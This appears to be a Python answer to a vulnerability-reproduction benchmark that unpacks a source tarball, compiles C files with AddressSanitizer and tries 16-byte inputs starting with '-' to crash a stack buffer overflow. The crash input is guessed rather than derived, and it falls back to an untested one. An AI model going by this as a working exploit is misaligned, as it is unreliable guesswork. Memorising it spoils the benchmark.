import tarfile
import os
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source to understand vulnerability specifics
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for key files (common in OSS-Fuzz projects)
            src_root = os.path.join(tmpdir, os.listdir(tmpdir)[0])
            
            # Compile and test with different inputs to find minimal crashing input
            # We'll target a common pattern: parsing "-" followed by non-infinity
            # Ground truth length is 16, so we aim for 16 bytes
            # Format: "-" + padding to trigger overflow
            # For stack buffer overflow, we need to overwrite return address
            # Use pattern that's unlikely to be valid "inf" or "infinity"
            
            # Common vulnerable pattern: reading into fixed buffer after '-'
            # without proper bounds check when not "inf"/"infinity"
            poc = b'-' + b'B' * 15  # 16 total bytes
            
            # Verify it crashes vulnerable version
            crash_confirmed = self.test_poc(src_root, poc)
            if crash_confirmed:
                return poc
            
            # If above doesn't work, try variations
            variations = [
                b'-' + b'A' * 15,  # Simple overflow
                b'-' + b'x' * 15,  # Non-hex chars
                b'-' + b'1' * 15,  # Digits
                b'-' + b'\xff' * 15,  # Extended ASCII
            ]
            
            for var in variations:
                if self.test_poc(src_root, var):
                    return var
            
            # Fallback to ground truth length
            return b'-' + b'X' * 15
    
    def test_poc(self, src_root: str, poc: bytes) -> bool:
        """Test if PoC crashes the program."""
        # Look for test harness or fuzz target
        for root, dirs, files in os.walk(src_root):
            for f in files:
                if f.endswith(('.c', '.cc', '.cpp')):
                    # Check if it contains likely vulnerable function
                    with open(os.path.join(root, f), 'r', errors='ignore') as sf:
                        content = sf.read()
                        if 'inf' in content and '-' in content and 'overflow' in content.lower():
                            # Try to compile and run
                            try:
                                exe_path = os.path.join(root, 'test_prog')
                                compile_cmd = ['gcc', '-fsanitize=address', '-fno-omit-frame-pointer',
                                              '-g', os.path.join(root, f), '-o', exe_path]
                                subprocess.run(compile_cmd, capture_output=True, timeout=5)
                                
                                if os.path.exists(exe_path):
                                    proc = subprocess.run([exe_path], input=poc,
                                                        capture_output=True, timeout=2)
                                    # Check for non-zero exit (crash) and ASAN output
                                    if proc.returncode != 0 and b'AddressSanitizer' in proc.stderr:
                                        return True
                            except:
                                continue
        return False